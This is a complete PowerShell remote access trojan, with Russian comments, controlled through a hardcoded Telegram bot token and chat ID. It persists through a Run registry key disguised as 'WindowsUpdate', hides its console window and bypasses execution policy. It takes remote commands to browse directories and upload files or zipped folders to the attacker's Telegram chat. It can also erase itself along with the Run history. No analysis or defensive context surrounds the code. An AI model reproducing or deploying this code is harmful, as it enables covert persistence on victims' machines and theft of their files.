# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"
$CurrentDir = Get-Location
$LastMessage = ""

# Функция отправки сообщений без дублирования
function Send-TGMessage {
    param($Text)
    if ($Text -eq $LastMessage) { return }
    $uri = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Text
        parse_mode = "HTML"
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body
        $script:LastMessage = $Text
    } catch { }
}

# Функция скачивания файла
function Send-File {
    param($Path)
    $uri = "https://api.telegram.org/bot$Token/sendDocument"
    $boundary = [System.Guid]::NewGuid().ToString()
    
    if (Test-Path $Path -PathType Container) {
        $zipPath = "$env:TEMP\$(Get-Random).zip"
        Compress-Archive -Path $Path -DestinationPath $zipPath
        $filePath = $zipPath
    } else {
        $filePath = $Path
    }

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
    $LF = "`r`n"

    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"$LF",
        $ChatID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $filePath -Leaf)`"",
        "Content-Type: application/octet-stream$LF",
        $fileEnc,
        "--$boundary--$LF"
    ) -join $LF

    try {
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { }
    
    if (Test-Path $Path -PathType Container) { Remove-Item $zipPath }
}

# Функция самоуничтожения
function SelfDestruct {
    # Удаление из автозагрузки
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue
    
    # Очистка истории Run
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
    
    # Удаление скрипта
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Sleep 2
    Remove-Item $scriptPath -Force
    exit
}

# Добавление в автозагрузку
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (-not (Get-ItemProperty -Path $regPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
}

# Скрытие окна
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# Основной цикл обработки команд
while ($true) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -Method Get
        if ($updates.ok -and $updates.result.Count -gt 0) {
            $lastUpdate = $updates.result[-1]
            $message = $lastUpdate.message
            if ($message -and $message.chat.id -eq $ChatID) {
                $text = $message.text
                $updateId = $lastUpdate.update_id
                
                # Обработка команд
                switch -regex ($text) {
                    "^/help$" {
                        $helpText = @"
Доступные команды:
/help - Список команд
/ls - Список файлов
/cd [path] - Смена директории
/download [file/folder] - Скачать файл/папку
/selfdestruct - Самоуничтожение
"@
                        Send-TGMessage -Text $helpText
                    }
                    "^/ls$" {
                        $files = Get-ChildItem -Path $CurrentDir | ForEach-Object {
                            if ($_.PSIsContainer) { "[DIR] $($_.Name)" } else { "[FILE] $($_.Name) $($_.Length/1KB) KB" }
                        }
                        $fileList = if ($files) { $files -join "`n" } else { "Папка пуста" }
                        Send-TGMessage -Text "Содержимое $CurrentDir`n$fileList"
                    }
                    "^/cd (.+)$" {
                        $newPath = $matches[1]
                        if (Test-Path $newPath -PathType Container) {
                            Set-Location $newPath
                            $CurrentDir = Get-Location
                            Send-TGMessage -Text "Перешел в $CurrentDir"
                        } else {
                            Send-TGMessage -Text "Директория не найдена"
                        }
                    }
                    "^/download (.+)$" {
                        $target = $matches[1]
                        if (Test-Path $target) {
                            Send-TGMessage -Text "Начинаю загрузку..."
                            Send-File -Path $target
                        } else {
                            Send-TGMessage -Text "Файл/папка не найдены"
                        }
                    }
                    "^/selfdestruct$" {
                        Send-TGMessage -Text "Начинаю самоуничтожение..."
                        SelfDestruct
                    }
                }
                
                # Отмечаем сообщение как обработанное
                Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$($updateId + 1)" -Method Get | Out-Null
            }
        }
    } catch { }
    Start-Sleep 2
}
